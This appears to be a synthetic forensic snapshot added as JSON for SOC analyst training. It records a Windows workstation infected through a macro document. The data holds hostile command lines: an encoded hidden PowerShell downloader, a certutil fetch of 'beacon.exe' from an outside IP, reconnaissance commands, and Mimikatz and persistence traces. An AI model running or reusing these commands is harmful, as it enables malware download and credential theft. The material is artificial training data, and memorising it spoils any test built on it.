@@ -1,0 +1,260 @@
+{
+  "host": "WKSTN-01",
+  "collection_time": "2026-05-06T10:30:00",
+  "collector": "SOC-L2-Analyst",
+  "running_processes": [
+    {
+      "pid": 4,
+      "name": "System",
+      "path": "",
+      "user": "SYSTEM",
+      "parent_pid": 0,
+      "cmdline": ""
+    },
+    {
+      "pid": 816,
+      "name": "svchost.exe",
+      "path": "C:\\Windows\\System32\\svchost.exe",
+      "user": "SYSTEM",
+      "parent_pid": 692,
+      "cmdline": "C:\\Windows\\System32\\svchost.exe -k netsvcs"
+    },
+    {
+      "pid": 4812,
+      "name": "powershell.exe",
+      "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "user": "alice",
+      "parent_pid": 3200,
+      "cmdline": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBKAFM="
+    },
+    {
+      "pid": 5100,
+      "name": "cmd.exe",
+      "path": "C:\\Windows\\System32\\cmd.exe",
+      "user": "alice",
+      "parent_pid": 4812,
+      "cmdline": "cmd.exe /c whoami && net user /domain && ipconfig /all"
+    },
+    {
+      "pid": 5500,
+      "name": "svchost.exe",
+      "path": "C:\\Users\\alice\\AppData\\Local\\Temp\\svchost.exe",
+      "user": "alice",
+      "parent_pid": 5100,
+      "cmdline": "C:\\Users\\alice\\AppData\\Local\\Temp\\svchost.exe"
+    },
+    {
+      "pid": 6100,
+      "name": "certutil.exe",
+      "path": "C:\\Windows\\System32\\certutil.exe",
+      "user": "alice",
+      "parent_pid": 5100,
+      "cmdline": "certutil.exe -urlcache -split -f http://185.220.101.47/beacon.exe C:\\Windows\\Temp\\svchost32.exe"
+    },
+    {
+      "pid": 1200,
+      "name": "explorer.exe",
+      "path": "C:\\Windows\\explorer.exe",
+      "user": "alice",
+      "parent_pid": 1100,
+      "cmdline": "C:\\Windows\\explorer.exe"
+    },
+    {
+      "pid": 3200,
+      "name": "winword.exe",
+      "path": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
+      "user": "alice",
+      "parent_pid": 1200,
+      "cmdline": "WINWORD.EXE /n \"C:\\Users\\alice\\Downloads\\invoice_march2026.docm\""
+    }
+  ],
+  "network_connections": [
+    {
+      "pid": 4812,
+      "process": "powershell.exe",
+      "local_ip": "10.0.1.5",
+      "local_port": 54321,
+      "remote_ip": "185.220.101.47",
+      "remote_port": 4444,
+      "state": "ESTABLISHED",
+      "protocol": "TCP"
+    },
+    {
+      "pid": 5500,
+      "process": "svchost.exe",
+      "local_ip": "10.0.1.5",
+      "local_port": 55000,
+      "remote_ip": "185.220.101.47",
+      "remote_port": 443,
+      "state": "ESTABLISHED",
+      "protocol": "TCP"
+    },
+    {
+      "pid": 816,
+      "process": "svchost.exe",
+      "local_ip": "10.0.1.5",
+      "local_port": 52000,
+      "remote_ip": "10.0.0.1",
+      "remote_port": 53,
+      "state": "TIME_WAIT",
+      "protocol": "UDP"
+    },
+    {
+      "pid": 1200,
+      "process": "explorer.exe",
+      "local_ip": "10.0.1.5",
+      "local_port": 56000,
+      "remote_ip": "13.107.42.16",
+      "remote_port": 443,
+      "state": "ESTABLISHED",
+      "protocol": "TCP"
+    }
+  ],
+  "registry_run_keys": [
+    {
+      "hive": "HKCU",
+      "key": "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "value_name": "WindowsUpdate",
+      "value_data": "C:\\Users\\alice\\AppData\\Roaming\\svchost.exe",
+      "type": "REG_SZ"
+    },
+    {
+      "hive": "HKCU",
+      "key": "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "value_name": "OneDriveSync",
+      "value_data": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe /background",
+      "type": "REG_SZ"
+    },
+    {
+      "hive": "HKLM",
+      "key": "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "value_name": "SecurityHealth",
+      "value_data": "C:\\Windows\\System32\\SecurityHealthSystray.exe",
+      "type": "REG_SZ"
+    }
+  ],
+  "recently_modified_files": [
+    {
+      "path": "C:\\Users\\alice\\AppData\\Local\\Temp\\svchost.exe",
+      "size_kb": 48,
+      "modified": "2026-05-06T09:01:10",
+      "hash_md5": "5d41402abc4b2a76b9719d911017c592",
+      "attributes": "HIDDEN,SYSTEM"
+    },
+    {
+      "path": "C:\\Windows\\Temp\\svchost32.exe",
+      "size_kb": 245,
+      "modified": "2026-05-06T09:15:00",
+      "hash_md5": "7b774effe4a349c6dd82ad4f4f21d34c",
+      "attributes": "HIDDEN"
+    },
+    {
+      "path": "C:\\Users\\alice\\Downloads\\invoice_march2026.docm",
+      "size_kb": 245,
+      "modified": "2026-05-06T08:58:00",
+      "hash_md5": "d41d8cd98f00b204e9800998ecf8427e",
+      "attributes": "NORMAL"
+    },
+    {
+      "path": "C:\\Users\\alice\\AppData\\Roaming\\svchost.exe",
+      "size_kb": 48,
+      "modified": "2026-05-06T09:02:00",
+      "hash_md5": "5d41402abc4b2a76b9719d911017c592",
+      "attributes": "HIDDEN"
+    },
+    {
+      "path": "C:\\Windows\\System32\\calc.exe",
+      "size_kb": 890,
+      "modified": "2025-01-10T00:00:00",
+      "hash_md5": "abc123def456abc123def456abc123de",
+      "attributes": "NORMAL"
+    }
+  ],
+  "scheduled_tasks": [
+    {
+      "name": "WindowsDefenderCleanup",
+      "path": "\\Microsoft\\Windows\\",
+      "action": "C:\\Users\\alice\\AppData\\Local\\Temp\\svchost.exe",
+      "trigger": "Every 5 minutes",
+      "created_by": "alice",
+      "status": "Ready"
+    },
+    {
+      "name": "GoogleUpdateTaskMachine",
+      "path": "\\Google\\Update\\",
+      "action": "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /c",
+      "trigger": "Daily",
+      "created_by": "SYSTEM",
+      "status": "Ready"
+    }
+  ],
+  "event_logs_summary": [
+    {
+      "event_id": 4624,
+      "count": 47,
+      "description": "Successful logons"
+    },
+    {
+      "event_id": 4625,
+      "count": 142,
+      "description": "Failed logons"
+    },
+    {
+      "event_id": 4688,
+      "count": 38,
+      "description": "Process creation events"
+    },
+    {
+      "event_id": 4698,
+      "count": 2,
+      "description": "Scheduled task created"
+    },
+    {
+      "event_id": 4663,
+      "count": 2847,
+      "description": "File access attempts"
+    }
+  ],
+  "prefetch_files": [
+    {
+      "executable": "POWERSHELL.EXE",
+      "run_count": 8,
+      "last_run": "2026-05-06T09:01:00",
+      "path_refs": [
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\"
+      ]
+    },
+    {
+      "executable": "CERTUTIL.EXE",
+      "run_count": 3,
+      "last_run": "2026-05-06T09:15:00",
+      "path_refs": [
+        "C:\\Windows\\System32\\"
+      ]
+    },
+    {
+      "executable": "MIMIKATZ.EXE",
+      "run_count": 1,
+      "last_run": "2026-05-06T09:10:00",
+      "path_refs": [
+        "C:\\Users\\alice\\AppData\\Local\\Temp\\"
+      ]
+    },
+    {
+      "executable": "SVCHOST.EXE-TEMP",
+      "run_count": 2,
+      "last_run": "2026-05-06T09:02:00",
+      "path_refs": [
+        "C:\\Users\\alice\\AppData\\Local\\Temp\\"
+      ]
+    },
+    {
+      "executable": "WINWORD.EXE",
+      "run_count": 1,
+      "last_run": "2026-05-06T08:58:00",
+      "path_refs": [
+        "C:\\Program Files\\Microsoft Office\\Office16\\"
+      ]
+    }
+  ]
+}
